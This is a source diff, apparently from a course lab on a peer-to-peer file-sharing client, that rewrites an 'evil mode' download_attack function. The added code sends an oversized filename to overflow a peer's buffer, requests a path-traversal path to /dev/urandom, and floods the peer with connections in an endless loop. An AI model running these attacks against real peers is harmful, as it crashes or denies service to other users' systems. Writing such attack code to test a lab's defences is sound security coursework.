@@ -769,67 +769,68 @@ static void task_upload(task_t *t)
 }
 
 // this is where the evil happens
-void download_attack(task_t *tracker_task, const char *filename)
+void download_attack(task_t *t, task_t *tracker_task)
 {
-	task_t *t = start_download(tracker_task, filename);
+	assert((!t || t->type == TASK_DOWNLOAD) && tracker_task->type == TASK_TRACKER);
 
-	if (t == NULL || t->peer_list == NULL){
+	if (!t || !t->peer_list){
 		error("* Error: Can't proceed with download attack.");
+		task_free(t);
 		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
+		goto try_again;
+
+	message("* Attacking %s:%d with '%s'\n", 
+		inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Error: can't connect to peer: %s\n", strerror(errno));
+		goto try_again;
 	}
-
 	
-	while (t->peer_list != NULL){
-		pid_t pid;
-		int num_attacks = 0;
+	// First attempt a buffer overflow on the filename
+	message("* Try attacking with filename buffer overflow\n");
+	// create buffer overflow input
+	char overflow[FILENAMESIZ * 3];
+	memset(overflow, 1, FILENAMESIZ*3);
+	// send input
+	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	
 
-		if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
-			continue;
+	//Next try a peer overrun attack
+	message("* Next trying peer denial of service\n");
+	// try once
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Error: can't connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	osp2p_writef(t->peer_fd, "GET ../../.../../dev/urandom OSP2P\n");	
 
-		if ((pid = fork()) < 0){
-			error("* Can't fork to attack");
-			task_free(t);
-			return;
-		}
-
-		if (pid > 0){
-			task_pop_peer(t);
-			continue;
-		}
-		
-		// First attempt a buffer overflow on the filename
-		message("* Try attacking with filename buffer overflow\n");
-		// create buffer overflow input
-		char overflow[FILENAMESIZ * 3];
-		memset(overflow, 1, FILENAMESIZ*3);
-		// send input
-		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	
-
-		//Next try a peer overrun attack
-		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
-			inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
-		// try once
+	// attack repeatedly
+	while (1) {
 		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 		if (t->peer_fd == -1) {
-			error("* Error: can't connect to peer: %s\n", strerror(errno));
-			goto end;
+			error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
+				, strerror(errno));
 		}
-		// attack repeatedly
-		while (1) {
-			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-			if (t->peer_fd == -1) {
-				error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
-					, strerror(errno));
-			}
-		}
-
-		end: 
-			close(t->peer_fd);
-			//All attacks on the peer done
-			message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
-			exit(0);
+		osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
 	}
-	task_free(t);
+
+	while (1){
+		int ret = read_to_taskbuf(t->peer_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Disk read error");
+			goto try_again;
+		} else if (ret == TBUF_END && t->head == t->tail)
+				break;
+	}
+
+	try_again: 
+		close(t->peer_fd);
+		//All attacks on the peer done
+		message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		task_pop_peer(t);
+		download_attack(t,tracker_task);
 }
 
 
@@ -932,8 +933,21 @@ int main(int argc, char *argv[])
 	}
 	//End 1 Code
 
-	if (evil_mode)
-		download_attack(tracker_task, "cat1.jpg");
+	if (evil_mode){
+		argv--;
+		strcpy(argv[1],"cat1.jpg");
+		if ((t = start_download(tracker_task, argv[1]))){
+			pid_t child;
+			child = fork();
+			if (child == 0){ //Child Process
+				download_attack(t, tracker_task);
+				exit(0);
+			} else if (child < 0){//ERROR
+				error("Fork error. Could not download file.\n");
+			}
+		}
+		
+	}
 
 	// Then accept connections from other peers and upload files to them!
 	//Exercise 1 - Parallel Uploads
